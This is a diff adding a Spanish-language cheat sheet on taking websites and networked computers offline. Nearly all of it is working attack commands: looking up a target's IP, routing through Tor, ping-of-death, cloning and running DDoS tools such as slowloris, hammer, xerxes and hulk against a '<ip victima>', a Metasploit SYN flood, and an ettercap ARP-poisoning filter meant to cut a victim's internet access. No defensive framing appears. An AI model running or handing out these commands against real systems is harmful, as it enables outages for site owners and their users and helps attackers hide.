@@ -1,0 +1,94 @@
+---------------------------------------------------------------
+////////////////////////////////////////////////////////////////////////////////////////////
+////// ATAQUES DE DENEGACION DE SERVICIOS - TUMBAR PAGINA WEB  /////////////////
+//////////////////////////////////////////////////////////////////////////////////////
+
+nslookup paginaweb.com     //Con este codigo en la consola de kali linux podemos ver la ip publica de una pagina
+
+apt-get install tor
+service tor start
+service tor status
+en mozilla vamos a preferencias buscamos proxy y escogemos manuel y en sock ponemos 127.0.0.1 y en port 9050
+PING DE LA MUERTE: //no me funciono tumbando mi propio servidor web
+ping <IP Address> -l 65500 -w 1 -n 1
+ping <IP Address> -t -l 15000
+
+SLOWLORIS : 
+git clone https://github.com/gkbrk/slowloris.git
+python slowloris.py 192.168.0.104 -s 5000      //Con este codigo usando la ip de la pagina mas un socket de 5000 se puede tumbar servicio web
+
+DDos-Attack:
+git clone https://github.com/Ha3MrX/DDos-Attack
+python ddos-attack.py
+
+DDos-Tor:
+git clone https://github.com/thelinuxchoice/ddostor
+bash ddostor.sh   //luego de descargar el git se ingresa a la pagina descargada y corremos la aplicacion con este codigo
+
+SLOWHTTPTEST: apt install slowhttpest
+
+HAMMER 
+git clone https://github.com/cyweb/hammer.git
+cd hammer
+python hammer.py
+python hammer.py -s <ipvictima>
+https://www.youtube.com/watch?v=MK4f69u40Bg
+https://youtu.be/nyzgorFnp8o
+
+SC DDOS SNIPER BLACKHAT TERSAKITI 
+git clone https://github.com/MrTamfanX/MCIDDOS
+
+cd MCIDDOS
+
+ls 
+
+python TamfanDdos.py
+
+python TamfanDdos.py [IP Target] [8080] [100000]
+
+dost-attack
+
+ //pide user name para poderlo descargar
+git clone https://github.com/verluchie/dost-attack
+
+cd dost-attack
+
+chmod 777 dost
+
+./install.sh
+
+dost
+
+XERXES: 
+apt install clang 
+git clone https://github.com/zanyarjamal/xerxes 
+cd xerxes 
+clang xerxes.c -o xerxes 
+./xerxes website 80 
+
+
+HULK
+Git clone https://github.com/grafov/hulk.git 
+Cd hulk 
+Python2 hull.py -site http://example.com/test/ 2>/dev/null
+
+METASPLOIT
+msfconsole
+use /auxiliary/dos/tcp/synflood
+set RHOST <ip victima>
+exploit
+
+ATAQUE DOS CON EXPLOIT DESDE KALILINUX 
+python <nombredelExploit.py> <ipdelavictima> <32 o 64>  //En la carpeta donde esta el exploit de DDOS
+
+DOSER, se descarga y luego se da doble click en el archivo
+http://www.mediafire.com/file/me38jmg...
+clave: ck4
+
+ATAQUE DDOS CONTRA UN COMPUTADOR CONECTADO A LA RED //confirmar si es .efe o .ef
+if(ip.src == '<ip victima>' || ip.dst == '<ip victima>')
+{drop();
+kill();
+msg("Dos attack \n");}     //Se crea un bloc de notas con este codigo y se le pone nombre "dos.elt"
+etterfilter dos.elt -o dos.ef  //esto se hace donde esta guardado el documento
+ettercap -i wlan0 -T -q -F dos.ef -M ARP ////  //se explota la vulnerabilidad y la victima no tendra mas internet.
